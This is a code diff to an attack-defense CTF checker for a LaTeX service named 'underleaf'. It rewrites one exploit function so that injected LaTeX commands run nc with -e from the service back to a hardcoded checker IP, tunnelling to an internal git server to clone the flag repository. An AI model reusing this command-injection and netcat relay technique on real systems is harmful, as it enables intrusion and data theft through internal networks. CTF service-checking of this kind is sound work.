@@ -1,3 +1,4 @@
+from calendar import c
 import secrets
 import json
 import os
@@ -8,6 +9,9 @@ import hashlib
 from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException, FlagSearcher
 from enochecker3.utils import assert_equals, assert_in
 from util import *
+
+import subprocess
+import asyncio
 
 checker = Enochecker("underleaf", service_port)
 def app(): return checker.app
@@ -105,11 +109,18 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, sea
 
 @checker.exploit(1)
 async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
-    (username, password, _, id) = await create_user_and_project(client, None, logger)
+    (_, _, _, id) = await create_user_and_project(client, None, logger)
 
     f_id = task.attack_info
 
-    commands = f"git clone http://nginx-git/{f_id}; cat ./{f_id}/main.tex"
+    # gizmo to forward a connection
+    checker_forward_port = "4244"
+    checker_ip = "192.168.178.33"
+    forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
+    
+    clone = subprocess.Popen(["bash", '-c', f"while true; do git clone http://127.0.0.1:1234/{f_id} /tmp/{f_id} &> /dev/null && break; done"])
+    commands = f"while true; do nc {checker_ip} {checker_forward_port} -e \"/usr/bin/nc nginx-git 80\"; done"
+    
 
     file_content = """\\documentclass[12pt]{minimal}
 \\usepackage{verbatim}
@@ -118,23 +129,26 @@ async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, sear
 \\end{document}
 """
     await upload_file(client, id, "main.tex", file_content, logger)
-    await compile(client, id, "main.tex", logger)
-    pdf_bytes = await download_pdf(client, id, logger)
+    await compile(client, id, "main.tex", logger, True)
 
-    file = f"/tmp/{id}.pdf"
-    with open(file, "wb") as f:
-        f.write(pdf_bytes)
+    forward.kill()
+    forward.wait()
 
-    os_succ(os.system(f"pdftotext {file} {file}.txt"))
-    
-    with open(f"{file}.txt", "r") as f:
+    clone.kill()
+    clone.wait()
+ 
+    assert_equals(os.path.exists(
+        f"/tmp/{f_id}/main.tex"), True, "file not downloaded")
+
+    with open(f"/tmp/{f_id}/main.tex", "r") as f:
         output = f.read()
+        
 
-    os.remove(f"{file}.txt")
-    os.remove(file)
-    
+    os_succ(os.system(f"rm -rf /tmp/{f_id}"))
+
     if flag := searcher.search_flag(output):
         return flag
+
 
 @checker.putnoise(0)
 async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
